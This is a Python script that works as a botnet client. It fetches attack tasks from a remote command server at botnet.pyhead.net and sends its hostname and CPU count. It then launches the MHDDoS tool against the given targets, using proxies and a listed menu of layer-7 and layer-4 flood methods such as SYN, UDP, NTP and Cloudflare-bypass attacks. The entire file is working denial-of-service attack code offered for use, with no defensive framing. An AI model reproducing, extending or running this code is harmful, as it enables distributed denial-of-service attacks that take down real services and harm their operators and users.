#!/usr/bin/env python3

import json
import subprocess
import sys
import psutil

from socket import gethostname
from time import sleep
from urllib.request import urlopen
from threading import Thread
from collections import namedtuple
from pathlib import Path
from logging import basicConfig, getLogger
from queue import Queue

import MHDDoS.start as MHDDoS

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")

logger = getLogger("Bot Runner")
logger.setLevel("INFO")

url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()};cpu_count={psutil.cpu_count()};"
logger.info(f"The task {url=}")

loop_time = 120
RETRY_PERIOD_SEC = 30


class Worker(Thread):
    """Thread executing tasks from a given tasks queue"""

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            finally:
                self.tasks.task_done()


class ThreadPool:
    """Pool of threads consuming tasks from a queue"""

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """Add a task to the queue"""
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        """Wait for completion of all the tasks in the queue"""
        self.tasks.join()


l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
      "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
      "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]


def customDecoder(Obj):
    return namedtuple('X', Obj.keys())(*Obj.values())


def runner(config):
    if int(config.Duration) > loop_time:
        period = loop_time
    else:
        period = config.Duration
    if config.UseProxy:
        if config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.ProxyType),
                str(config.Threads),
                str(config.ProxyList),
                str(config.RPC),
                str(period)
            ]
        else:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.Threads),
                str(period),
                str(config.ProxyType),
                str(config.ProxyList)
            ]
    else:
        if not config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.Threads),
                str(period)
            ]
        else:
            logger.info(
                'No we cant run the LEVEL7 attacks without proxy. Skipping')
    try:
        subprocess.run([sys.executable, "MHDDoS/start.py", *params])
    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.info(f"OOPS... {config.Dst} -> Some issue: {error=}")


if __name__ == '__main__':

    try:
        pool = ThreadPool(int(psutil.cpu_count() / 2) + 1)

        MHDDoS.threads = 1000
        proxy_config = json.load(open("MHDDoS/config.json"))

        MHDDoS.handleProxyList(proxy_config, Path(
            "MHDDoS/files/proxies/proxylist.txt"), 0, url=None)

        while True:

            logger.info("Getting fresh tasks from the server!")
            try:

                for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
                    while int(psutil.cpu_percent()) > 70:
                        logger.info(
                            "The CPU load is too high. Thread waiting...")
                        logger.info(
                            f"Queue size: {pool.tasks.qsize()}, Next task {conf.Dst}")
                        sleep(loop_time)

                    pool.add_task(runner, conf)
                    sleep(loop_time / 4)

                pool.wait_completion()

            except Exception as error:
                logger.critical(f"OOPS... We faced an issue: {error}")
                logger.info("The system works good! Thanks :P ")
                logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                sleep(RETRY_PERIOD_SEC)

    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.critical(f"OOPS... We faced an issue: {error=}")
        logger.info("Please restart the tool! Thanks")
